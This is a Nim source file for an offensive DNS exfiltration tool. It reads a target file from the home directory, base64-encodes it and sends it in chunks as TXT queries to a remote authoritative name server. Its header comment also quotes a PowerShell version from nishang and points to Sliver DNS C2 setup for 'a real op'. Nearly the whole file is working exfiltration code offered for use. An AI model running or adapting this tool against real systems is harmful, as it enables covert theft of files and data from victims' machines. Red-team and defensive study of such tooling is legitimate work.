#[    

    Author: HuskyHacks, Twitter: @HuskyHacksMK
    License: BSD 3-Clause

    Description: A simple DNS exfiltrator. Reads in the bytes of a specified file, converts them to URL safe b64, then makes TXT record queries to a specified DNS authoritative server.

    Copmpile:
        nim c --d:mingw --d:debug --app=console dns_exfiltrate.nim

    Inspired by: https://github.com/samratashok/nishang/blob/master/Utility/Do-Exfiltration.ps1
    Something like this:
    ---
        elseif ($ExfilOption -eq "DNS")
        {
            $code = Compress-Encode
            $queries = [int]($code.Length/63)
            while ($queries -ne 0)
            {
                $querystring = $code.Substring($lengthofsubstr,63)
                Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $AuthNS"
                $lengthofsubstr += 63
                $queries -= 1
            }
            $mod = $code.Length%63
            $query = $code.Substring($code.Length - $mod, $mod)
            Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
    ---

    You'll want a listening DNS server at the far end of this to catch the data as it traverses.

    See the Sliver wiki page on DNS C2 for a quick guide on how to set up the required records to do this on a real op:
        https://github.com/BishopFox/sliver/wiki/DNS-C2#setup

]#

import dnsclient
import os
from base64 import encode


const CHUNK_SIZE = 62

let homeDir = getHomeDir()
var domain_name = ".yourdnsrecord.local"
var auth_ns = "ns1.authdns.local"
var target_file = homeDir & r"deathstar_engineering_docs.docx"

proc dns_exfiltrate(ns: string, dom: string, target: string): void =
    var content = readFile(target)
    let b64 = encode(content, safe=true)

    var stringindex = 0
    while stringindex <= b64.len-1:
        try:
            var query =  b64[stringindex .. (if stringindex + CHUNK_SIZE - 1 > b64.len - 1: b64.len - 1 else: stringindex + CHUNK_SIZE - 1)]
            let client = newDNSClient(ns)
            var dnsquery = query & dom
            # echo "[*] ", dnsquery
            discard(client.sendQuery(dnsquery, TXT))
            stringindex += CHUNK_SIZE
            sleep(3000)
        except:
            echo "[-] Something broke fam"
            quit(1)


when isMainModule:
    dns_exfiltrate(authNS, domainName, target_file)